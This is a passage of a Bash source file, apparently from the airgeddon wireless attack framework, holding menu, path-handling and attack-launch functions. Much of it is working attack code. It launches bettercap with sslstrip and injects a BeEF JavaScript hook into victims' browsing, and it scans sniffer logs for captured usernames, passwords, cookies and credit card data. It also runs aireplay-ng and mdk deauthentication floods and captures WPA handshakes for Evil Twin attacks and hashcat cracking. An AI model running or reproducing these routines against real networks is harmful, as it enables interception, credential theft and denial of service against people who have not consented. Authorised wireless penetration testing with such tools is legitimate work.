		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			cd "${beef_path}"
			get_tmux_process_id "./beef -c \"${beef_file}\""
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi
	else
		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[17]}" "BeEF"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			get_tmux_process_id "{optional_tools_names[18]}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	fi

	sleep 2
}

#Launch bettercap sniffer
#shellcheck disable=SC2001
function launch_bettercap_sniffing() {

	debug_print

	local bettercap_window_title

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing_sslstrip2")
			sniffing_scr_window_position=${g3_bottomright_window}
			bettercap_window_title="Sniffer+Bettercap-Sslstrip2"
		;;
		"et_sniffing_sslstrip2_beef")
			sniffing_scr_window_position=${g4_bottomright_window}
			bettercap_window_title="Sniffer+Bettercap-Sslstrip2/BeEF"
		;;
	esac

	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
		set_bettercap_config

		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"

		if [ ${bettercap_log} -eq 1 ]; then
			bettercap_cmd+=" | tee ${tmp_bettercaplog}"
		fi
	else
		if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
		fi

		if [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module --dns-port ${bettercap_dns_port}"
		else
			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
		fi

		if [ ${bettercap_log} -eq 1 ]; then
			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
		fi
	fi

	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"${bettercap_window_title}\"" "${bettercap_cmd}" "${bettercap_window_title}"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		local bettercap_cmd_clean_for_pid_finding
		bettercap_cmd_clean_for_pid_finding=$(echo "${bettercap_cmd}" | sed 's/ |.*//')
		get_tmux_process_id "${bettercap_cmd_clean_for_pid_finding}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	else
		et_processes+=($!)
	fi
}

#Parse ettercap log searching for captured passwords
function parse_ettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep -E -i "USER:|PASS:")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo "${cpass}" >> "${tmpdir}parsed_file"
		pass_counter=$((pass_counter + 1))
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ ${pass_counter} -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 306 "blue"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Parse bettercap log searching for captured passwords
function parse_bettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
		sed -Ei 's/\x1b\[[0-9;]*m.+\x1b\[[0-9;]K//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/\x1b\[[0-9;]*m|\x1b\[J|\x1b\[[0-9;]K|\x8|\xd//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/.*»//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/^[[:blank:]]*//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei '/^$/d' "${tmp_bettercaplog}" 2> /dev/null
	fi

	local regexp='USER|UNAME|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL|NET.SNIFF.HTTP.REQUEST.*POST|HTTP\].*POST'
	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i "${regexp}" | grep -E -vi "${regexp2}")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	captured_cookies=()
	for cpass in "${BETTERCAPLOG[@]}"; do
		if [[ ${cpass^^} =~ ${regexp^^} ]]; then
			repeated_cookie=0
			for item in "${captured_cookies[@]}"; do
				if [ "${item}" = "${cpass}" ]; then
					repeated_cookie=1
					break
				fi
			done
			if [ ${repeated_cookie} -eq 0 ]; then
				captured_cookies+=("${cpass}")
				echo "${cpass}" >> "${tmpdir}parsed_file"
				pass_counter=$((pass_counter + 1))
			fi
		else
			echo "${cpass}" >> "${tmpdir}parsed_file"
			pass_counter=$((pass_counter + 1))
		fi
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ ${pass_counter} -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 399 "blue"
		cp "${tmpdir}parsed_file" "${bettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Write on a file the id of the captive portal Evil Twin attack processes
function write_et_processes() {

	debug_print

	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${webdir}${et_processesfile}"
	done
}

#Write on a file the id of the Enterprise Evil Twin attack processes
function write_enterprise_processes() {

	debug_print

	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${enterprisedir}${enterprise_processesfile}"
	done
}

#Kill the Evil Twin and Enterprise processes
function kill_et_windows() {

	debug_print

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		kill_dos_pursuit_mode_processes
		case ${et_dos_attack} in
			"${mdk_command}"|"Wds Confusion")
				kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
			;;
			"Aireplay")
				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
			;;
		esac
	fi

	for item in "${et_processes[@]}"; do
		kill "${item}" &> /dev/null
	done

	if [ -n "${enterprise_mode}" ]; then
		kill "${enterprise_process_control_window}" &> /dev/null
		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
	else
		kill "${et_process_control_window}" &> /dev/null
		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C dnsmasq --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}

#Kill DoS pursuit mode processes
function kill_dos_pursuit_mode_processes() {

	debug_print

	for item in "${dos_pursuit_mode_pids[@]}"; do
		kill -9 "${item}" &> /dev/null
		wait "${item}" 2> /dev/null
	done

	if ! stty sane > /dev/null 2>&1; then
		reset > /dev/null 2>&1
	fi
	sleep 1
}

#Set current channel reading it from file
function recover_current_channel() {

	debug_print

	local recovered_channel
	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
	if [ -n "${recovered_channel}" ]; then
		channel="${recovered_channel}"
	fi
}

#Convert capture file to hashcat format
function convert_cap_to_hashcat_format() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	if [ "${hccapx_needed}" -eq 0 ]; then
		echo "1" | timeout -s SIGTERM 3 aircrack-ng "${enteredpath}" -J "${tmpdir}${hashcat_tmp_simple_name_file}" -b "${bssid}" > /dev/null 2>&1
		return 0
	else
		hccapx_converter_found=0
		if hash ${hccapx_tool} 2> /dev/null; then
			hccapx_converter_found=1
			hccapx_converter_path="${hccapx_tool}"
		else
			for item in "${possible_hccapx_converter_known_locations[@]}"; do
				if [ -f "${item}" ]; then
					hccapx_converter_found=1
					hccapx_converter_path="${item}"
					break
				fi
			done
		fi

		if [ "${hccapx_converter_found}" -eq 1 ]; then
			hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccapx"
			"${hccapx_converter_path}" "${enteredpath}" "${tmpdir}${hashcat_tmp_file}" > /dev/null 2>&1
			return 0
		else
			echo
			language_strings "${language}" 436 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi
}

#Handshake/PMKID tools menu
function handshake_pmkid_tools_menu() {

	debug_print

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_pmkid_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 663 pmkid_dependencies[@]
	language_strings "${language}" 121
	print_simple_separator
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " handshake_option
	case ${handshake_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WPA"
		;;
		5)
			capture_pmkid_handshake "pmkid"
		;;
		6)
			capture_pmkid_handshake "handshake"
		;;
		7)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_pmkid_tools_menu
}

#Execute the cleaning of a Handshake file
function exec_clean_handshake_file() {

	debug_print

	echo
	if ! check_valid_file_to_clean "${filetoclean}"; then
		language_strings "${language}" 159 "yellow"
	else
		wpaclean "${filetoclean}" "${filetoclean}" > /dev/null 2>&1
		language_strings "${language}" 153 "yellow"
	fi
	language_strings "${language}" 115 "read"
}

#Validate and ask for the parameters used to clean a Handshake file
function clean_handshake_file_option() {

	debug_print

	echo
	readpath=0

	if [ -z "${enteredpath}" ]; then
		language_strings "${language}" 150 "blue"
		readpath=1
	else
		language_strings "${language}" 151 "blue"
		ask_yesno 152 "yes"
		if [ "${yesno}" = "y" ]; then
			filetoclean="${enteredpath}"
		else
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	exec_clean_handshake_file
}

#DoS attacks menu
function dos_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 102 "title"
	current_menu="dos_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 51 mdk_attack_dependencies[@]
	language_strings "${language}" 52 aireplay_attack_dependencies[@]
	language_strings "${language}" 53 mdk_attack_dependencies[@]
	language_strings "${language}" 54 "separator"
	language_strings "${language}" 62 mdk_attack_dependencies[@]
	language_strings "${language}" 63 mdk_attack_dependencies[@]
	language_strings "${language}" 64 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " dos_option
	case ${dos_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				mdk_deauth_option
			fi
		;;
		6)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aireplay_deauth_option
			fi
		;;
		7)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wds_confusion_option
			fi
		;;
		8)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				beacon_flood_option
			fi
		;;
		9)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				auth_dos_option
			fi
		;;
		10)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				michael_shutdown_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	dos_attacks_menu
}

#Capture Handshake on Evil Twin attack
function capture_handshake_evil_twin() {

	debug_print

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	ask_timeout "capture_handshake"
	capture_handshake_window

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Aireplay")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Wds Confusion")
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=16
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
	else
		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	handshake_capture_check

	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"; then

		handshakepath="${default_save_path}"
		handshakefilename="handshake-${bssid}.cap"
		handshakepath="${handshakepath}${handshakefilename}"

		echo
		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "writeethandshake"
		done

		cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
		echo
		language_strings "${language}" 324 "blue"
		language_strings "${language}" 115 "read"
		return 0
	else
		echo
		language_strings "${language}" 146 "red"
		language_strings "${language}" 115 "read"
		return 2
	fi
}

#Capture Handshake on Handshake/PMKID tools
function capture_pmkid_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	language_strings "${language}" 126 "yellow"
	language_strings "${language}" 115 "read"

	if [ "${1}" = "handshake" ]; then
		dos_handshake_menu
	else
		get_hcxdumptool_version
		launch_pmkid_capture
	fi
}

#Check if file exists
function check_file_exists() {

	debug_print

	if [[ ! -f "${1}" ]] || [[ -z "${1}" ]]; then
		language_strings "${language}" 161 "red"
		return 1
	fi
	return 0
}

#Validate path
function validate_path() {

	debug_print

	lastcharmanualpath=${1: -1}

	if [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
		dirname=$(dirname "${1}")

		if [ -d "${dirname}" ]; then
			if ! check_write_permissions "${dirname}"; then
				language_strings "${language}" 157 "red"
				return 1
			fi
		else
			if ! dir_permission_check "${1}"; then
				language_strings "${language}" 526 "red"
				return 1
			fi
		fi

		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		fi
	else
		dirname=${1%/*}

		if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
			language_strings "${language}" 156 "red"
			return 1
		fi

		if ! check_write_permissions "${dirname}"; then
			language_strings "${language}" 157 "red"
			return 1
		fi
	fi

	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		else
			pathname="${1}"
		fi

		case ${2} in
			"handshake")
				enteredpath="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"pmkid")
				enteredpath="${pathname}${standardpmkid_filename}"
				suggested_filename="${standardpmkid_filename}"
			;;
			"pmkidcap")
				enteredpath="${pathname}${standardpmkidcap_filename}"
				suggested_filename="${standardpmkidcap_filename}"
			;;
			"aircrackpot")
				suggested_filename="${aircrackpot_filename}"
				aircrackpotenteredpath+="${aircrackpot_filename}"
			;;
			"jtrpot")
				suggested_filename="${jtrpot_filename}"
				jtrpotenteredpath+="${jtrpot_filename}"
			;;
			"hashcatpot")
				suggested_filename="${hashcatpot_filename}"
				potenteredpath+="${hashcatpot_filename}"
			;;
			"asleappot")
				suggested_filename="${asleappot_filename}"
				asleapenteredpath+="${asleappot_filename}"
			;;
			"ettercaplog")
				suggested_filename="${default_ettercaplogfilename}"
				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
			;;
			"bettercaplog")
				suggested_filename="${default_bettercaplogfilename}"
				bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
			;;
			"writeethandshake")
				et_handshake="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"wpspot")
				suggested_filename="${wpspot_filename}"
				wpspotenteredpath+="${wpspot_filename}"
			;;
			"weppot")
				suggested_filename="${weppot_filename}"
				weppotenteredpath+="${weppot_filename}"
			;;
			"enterprisepot")
				enterprise_potpath="${pathname}"
				enterprise_basepath=$(dirname "${enterprise_potpath}")

				if [[ "${enterprise_basepath}" != "." ]]; then
					enterprise_dirname=$(basename "${enterprise_potpath}")
				fi

				if [ "${enterprise_basepath}" != "/" ]; then
					enterprise_basepath+="/"
				fi

				if [ "${enterprise_dirname}" != "${enterprisepot_suggested_dirname}" ]; then
					enterprise_completepath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"
				else
					enterprise_completepath="${enterprise_potpath}"
					if [ "${enterprise_potpath: -1}" != "/" ]; then
						enterprise_completepath+="/"
					fi
				fi

				echo
				language_strings "${language}" 158 "yellow"
				return 0
			;;
			"certificates")
				enterprisecertspath="${pathname}"
				enterprisecerts_basepath=$(dirname "${enterprisecertspath}")

				if [ "${enterprisecerts_basepath}" != "/" ]; then
					enterprisecerts_basepath+="/"
				fi

				enterprisecerts_completepath="${enterprisecertspath}"
				if [ "${enterprisecertspath: -1}" != "/" ]; then
					enterprisecerts_completepath+="/"
				fi

				echo
				language_strings "${language}" 158 "yellow"
				return 0
			;;
		esac

		echo
		language_strings "${language}" 155 "yellow"
		return 0
	fi

	echo
	language_strings "${language}" 158 "yellow"
	return 0
}

#It checks the write permissions of a directory recursively
function dir_permission_check() {

	debug_print

	if [ -e "${1}" ]; then
		if [ -d "${1}" ] && check_write_permissions "${1}" && [ -x "${1}" ]; then
			return 0
		else
			return 1
		fi
	else
		dir_permission_check "$(dirname "${1}")"
		return $?
	fi
}

#Check for write permissions on a given path
function check_write_permissions() {

	debug_print

	if [ -w "${1}" ]; then
		return 0
	fi
	return 1
}

#Clean some special chars from strings usually messing with autocompleted paths
function fix_autocomplete_chars() {

	debug_print

	local var
	var=${1//\\/$''}

	echo "${var}"
}

#Create a var with the name passed to the function and reading the value from the user input
function read_and_clean_path() {

	debug_print

	local var
	settings="$(shopt -p extglob)"
	shopt -s extglob

	echo -en '> '
	var=$(read -re _var; echo -n "${_var}")
	var=$(fix_autocomplete_chars "${var}")
	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
	[[ ${var} =~ ${regexp} ]] && var="${BASH_REMATCH[1]}"
	eval "${1}=\$var"

	eval "${settings}"
}

#Read and validate a path
function read_path() {

	debug_print

	echo
	case ${1} in
		"handshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${handshakepath}"
			fi
			validate_path "${enteredpath}" "${1}"
		;;
		"cleanhandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "filetoclean"
			check_file_exists "${filetoclean}"
		;;
		"pmkid")
			language_strings "${language}" 674 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${pmkidpath}"
			fi
			validate_path "${enteredpath}" "${1}"
		;;
		"pmkidcap")
			language_strings "${language}" 686 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${pmkidcappath}"
			fi
			validate_path "${enteredpath}" "${1}"
		;;
		"dictionary")
			language_strings "${language}" 180 "green"
			read_and_clean_path "DICTIONARY"
			check_file_exists "${DICTIONARY}"
		;;
		"targetfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "enteredpath"
			check_file_exists "${enteredpath}"
		;;
		"targethashcatpmkidfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "hashcatpmkidenteredpath"
			check_file_exists "${hashcatpmkidenteredpath}"
		;;
		"targethashcatenterprisefilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "hashcatenterpriseenteredpath"
			check_file_exists "${hashcatenterpriseenteredpath}"
		;;
		"targetjtrenterprisefilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "jtrenterpriseenteredpath"
			check_file_exists "${jtrenterpriseenteredpath}"
		;;
		"rules")
			language_strings "${language}" 242 "green"
			read_and_clean_path "RULES"
			check_file_exists "${RULES}"
		;;
		"aircrackpot")
			language_strings "${language}" 441 "green"
			read_and_clean_path "aircrackpotenteredpath"
			if [ -z "${aircrackpotenteredpath}" ]; then
				aircrackpotenteredpath="${aircrack_potpath}"
			fi
			validate_path "${aircrackpotenteredpath}" "${1}"
		;;
		"jtrpot")
			language_strings "${language}" 611 "green"
			read_and_clean_path "jtrpotenteredpath"
			if [ -z "${jtrpotenteredpath}" ]; then
				jtrpotenteredpath="${jtr_potpath}"
			fi
			validate_path "${jtrpotenteredpath}" "${1}"
		;;
		"hashcatpot")
			language_strings "${language}" 233 "green"
			read_and_clean_path "potenteredpath"
			if [ -z "${potenteredpath}" ]; then
				potenteredpath="${hashcat_potpath}"
			fi
			validate_path "${potenteredpath}" "${1}"
		;;
		"asleappot")
			language_strings "${language}" 555 "green"
			read_and_clean_path "asleapenteredpath"
			if [ -z "${asleapenteredpath}" ]; then
				asleapenteredpath="${asleap_potpath}"
			fi
			validate_path "${asleapenteredpath}" "${1}"
		;;
		"ettercaplog")
			language_strings "${language}" 303 "green"
			read_and_clean_path "ettercap_logpath"
			if [ -z "${ettercap_logpath}" ]; then
				ettercap_logpath="${default_ettercap_logpath}"
			fi
			validate_path "${ettercap_logpath}" "${1}"
		;;
		"bettercaplog")
			language_strings "${language}" 398 "green"
			read_and_clean_path "bettercap_logpath"
			if [ -z "${bettercap_logpath}" ]; then
				bettercap_logpath="${default_bettercap_logpath}"
			fi
			validate_path "${bettercap_logpath}" "${1}"
		;;
		"ethandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "et_handshake"
			check_file_exists "${et_handshake}"
		;;
		"writeethandshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "et_handshake"
			if [ -z "${et_handshake}" ]; then
				et_handshake="${handshakepath}"
			fi
			validate_path "${et_handshake}" "${1}"
		;;
		"et_captive_portallog")
			language_strings "${language}" 317 "blue"
			read_and_clean_path "et_captive_portal_logpath"
			if [ -z "${et_captive_portal_logpath}" ]; then
				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
			fi
			validate_path "${et_captive_portal_logpath}" "${1}"
		;;
		"wpspot")
			language_strings "${language}" 123 "blue"
			read_and_clean_path "wpspotenteredpath"
			if [ -z "${wpspotenteredpath}" ]; then
				wpspotenteredpath="${wps_potpath}"
			fi
			validate_path "${wpspotenteredpath}" "${1}"
		;;
		"weppot")
			language_strings "${language}" 430 "blue"
			read_and_clean_path "weppotenteredpath"
			if [ -z "${weppotenteredpath}" ]; then
				weppotenteredpath="${wep_potpath}"
			fi
			validate_path "${weppotenteredpath}" "${1}"
		;;
		"enterprisepot")
			language_strings "${language}" 525 "blue"
			read_and_clean_path "enterprisepotenteredpath"
			if [ -z "${enterprisepotenteredpath}" ]; then
				enterprisepotenteredpath="${enterprise_potpath}"
			fi
			validate_path "${enterprisepotenteredpath}" "${1}"
		;;
		"certificates")
			language_strings "${language}" 643 "blue"
			read_and_clean_path "certificatesenteredpath"
			if [ -z "${certificatesenteredpath}" ]; then
				certificatesenteredpath="${enterprisecertspath}"
			fi
			validate_path "${certificatesenteredpath}" "${1}"
		;;
	esac

	validpath="$?"
	return "${validpath}"
}

#Launch the DoS selection menu before capture a Handshake and process the captured file
function dos_handshake_menu() {

	debug_print

	if [ "${return_to_handshake_pmkid_tools_menu}" -eq 1 ]; then
		return
	fi

	clear
	language_strings "${language}" 138 "title"
	current_menu="dos_handshake_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 147
	print_simple_separator
	language_strings "${language}" 139 mdk_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " attack_handshake_option
	case ${attack_handshake_option} in
		0)
			return
		;;
		1)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake"
				capture_handshake_window
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=12
				launch_handshake_capture
			fi
		;;
		2)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake"
				capture_handshake_window
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=12
				launch_handshake_capture
			fi
		;;
		3)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake"
				capture_handshake_window
				recalculate_windows_sizes
